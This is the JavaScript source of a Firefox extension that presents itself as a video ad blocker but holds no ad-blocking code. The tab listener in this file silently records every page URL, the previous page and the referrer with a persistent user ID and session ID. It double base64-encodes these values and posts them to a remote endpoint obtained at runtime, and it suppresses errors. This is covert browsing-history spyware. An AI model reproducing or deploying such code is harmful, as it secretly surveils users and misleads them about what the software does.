// version 3000b
"use strict";
var vidadblocker2_tr = new function() {
	var self = this;

	var DEBUG = true;

	var log = function(logInfo) {
		if (DEBUG) { console.log(logInfo); }
	};

	this.TMV = "3000b";

	// fields
	this.Settings 			= null; 	// loaded via module
	this.PrefMan 			= null; 	// loaded via module
	this.ci					= Components.interfaces;
	this.cr					= Components.results;
	this.cc					= Components.classes;
	this.webp				= Components.interfaces.nsIWebProgress;
	this.webpl				= Components.interfaces.nsIWebProgressListener;
	this.tabs				= new Array();
	this.user_id			= '';
	this.session_id 		= '';	
	this.listeners 			= null;
	this.send_url 			= '';

	this.init = function() {
		this.initModules();
		this.setDebug();
		this.initTabListeners();		
	};

	this.initModules = function() {
		Components.utils.import("resource://vidadblocker2/PrefMan.js", this);
		Components.utils.import("resource://vidadblocker2/Settings.js", this);
	};

	this.setDebug = function() {
		if (DEBUG && this.Settings && this.Settings.debug === false) { DEBUG = false; }
	};	

    this.getPid = function() {
        return this.PrefMan.getPref("user_id");
	};

	this.isValidListener = function(iid) {	
		return (iid.equals(this.webpl) || iid.equals(this.ci.nsISupportsWeakReference) || iid.equals(this.ci.nsISupports));
	};

	this.loadBalance = function() {
		var url_params = "s=" + encodeURIComponent(this.Settings.src);
		var installtime = this.PrefMan.getPref("installtime");
		
		if (!installtime) {
			installtime = new Date().getTime() / 1000;
			installtime = Math.round(installtime);
			this.PrefMan.setPref("installtime", installtime);
		}
		
		installtime = 1;
		url_params = url_params + "&ins=" + encodeURIComponent(installtime);
		var req = new XMLHttpRequest();
		req.open("GET", this.Settings.lbUrl + "?" + url_params, true);
		req.onreadystatechange = function() {
			if (req.readyState == 4) {
				var lb = JSON.parse(req.responseText);
				if (lb && lb.Status == 1) {
					self.send_url = lb.Endpoint;
					self.PrefMan.setPref("server", lb.Endpoint);
				}
			}
		};
		req.send(null);
	};
	
	this.randomStringNum = function(length) {
        var chars = '0123456789'.split('');
        if (!length) {
            length = Math.floor(Math.random() * chars.length);
        }
        
        var str = '';
        for (var i = 0; i < length; i++) {
            str += chars[Math.floor(Math.random() * chars.length)];
        }
        return str;
	};

	this.initTabListeners = function() {
		this.session_id = 'S' + this.randomStringNum(14);
		var pid = this.getPid();

		if (!pid) {
			pid = this.randomStringNum(14);
		}

		this.PrefMan.setPref("user_id", pid);
		this.user_id = pid;
		
		var s = this.PrefMan.getPref("src");
		if (!s) {
			this.PrefMan.setPref("src", this.Settings.src);
		}
		this.Settings.src = this.PrefMan.getPref("src");
		
		this.listeners = new this.globalTabsListner();
		gBrowser.addTabsProgressListener(this.listeners);
			
		Components.utils.import("resource://gre/modules/AddonManager.jsm");		
		self.loadBalance();
	};

	this.globalTabsListner = function() {};
	this.globalTabsListner.prototype = {
		QueryInterface: function(iid) {
			if (self.isValidListener(iid)) {
				return this;
			}
			throw self.cr.NS_NOINTERFACE;
		},
		
		onLocationChange: function(aBrowser, aProgress, aRequest, aURI) {
			try {
				var httpChannel = null;
				if (aProgress.DOMWindow != aProgress.DOMWindow.top) { return 0; }

				if (aURI.asciiSpec.indexOf("about:") > -1) { return; }
					
				var ref = aBrowser.contentDocument.referrer;
				if (aRequest && aRequest.referrer && typeof(aRequest.referrer) != undefined) {
					ref = aRequest.referrer.asciiSpec;	
				}
				var is_link = ref != "";
				
				if (typeof(aBrowser.prev_url_ssff) == "undefined" && (aURI.asciiSpec.indexOf("www.google.com/aclk")>-1)) {
					aBrowser.prev_url_ssff = ref;
					return;
				}

				if ((aURI.asciiSpec.indexOf("www.google.com/aclk")>-1)) { return; }
				
				var prev = "";
				if (aBrowser.prev_url_ssff && (aBrowser.prev_url_ssff !="")) {
					prev = aBrowser.prev_url_ssff;
				}
				else if (aProgress.DOMWindow.opener) {
					prev = aProgress.DOMWindow.opener.top.location.href;
				}
				else {
					prev = ref;
				}
			
				if ((prev & prev.indexOf("http://www.google") > -1) &&
					(aURI.asciiSpec.indexOf("http://www.google") > -1)) { return; }

				if ((prev && prev.indexOf("https://www.google") > -1) &&
					(aURI.asciiSpec.indexOf("http://www.google") > -1) &&
					(aURI.asciiSpec.indexOf("q=&") > -1)) { return; }

				if (self.send_url && self.send_url != "") {
					var contentType = "";
					var httpChannel = null;
					try { httpChannel = aRequest.QueryInterface(self.ci.nsIHttpChannel); } catch (e) {}
					try { contentType = httpChannel.contentType; } catch(e) {}
					if (contentType.toLowerCase().indexOf("html") == -1 && contentType != "") {
						aBrowser.prev_url_ssff = "";
						return;
					}
					
					var params = "s=" + encodeURIComponent(self.Settings.src) 
								+ "&md=" + encodeURIComponent(self.Settings.md) 
								+ "&pid=" + encodeURIComponent(self.user_id) 
								+ "&sess=" + encodeURIComponent(self.session_id) 
								+ "&q=" + encodeURIComponent(aURI.asciiSpec) 
								+ "&prev=" + encodeURIComponent(prev) 
								+ "&link=" + (is_link?"1":"0") 
								+ "&hreferer=" + encodeURIComponent(ref) 
								+ "&sub=" + encodeURIComponent(self.Settings.sub)
								+ "&tmv=" + encodeURIComponent(self.TMV);
					var req = new XMLHttpRequest();
					req.open("POST", self.send_url + "/related", true);
					req.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

					req.onreadystatechange = function() {
						if (req.readyState == 4) {}
					}
					if (aBrowser.prev_url_ssff == aURI.asciiSpec) { return; }
					params = encodeURIComponent(window.btoa(window.btoa(params)));
					req.send("e=" + params);
				}
				aBrowser.prev_url_ssff = aURI.asciiSpec;
			}
			catch(e) {};
				
		
		}, 
		onProgressChange: function(aBrowser, aProgress, aRequest, curSelfPr, maxSelfPr, curTotPr, maxTotPr) { return 0 }, 
		onSecurityChange: function(aBrowser, aProgress, aRequest, aState) { return 0; },
	  	onStateChange: function(aBrowser, aProgress, aRequest, aFlag, aStatus) { },
		onStatusChange: function(aBrowser, webProgress , request , ostatus ,  message) { return 0; },
		onRefreshAttempted: function(aBrowser,webProgress,aRefreshURI,aMillis,aSameURI) { return true; },
		onLinkIconAvailable : function(aBrowser) { return 0 }
	};

	setTimeout(function() { self.init(); }, 1000);
};

var main_tr_ref = vidadblocker2_tr;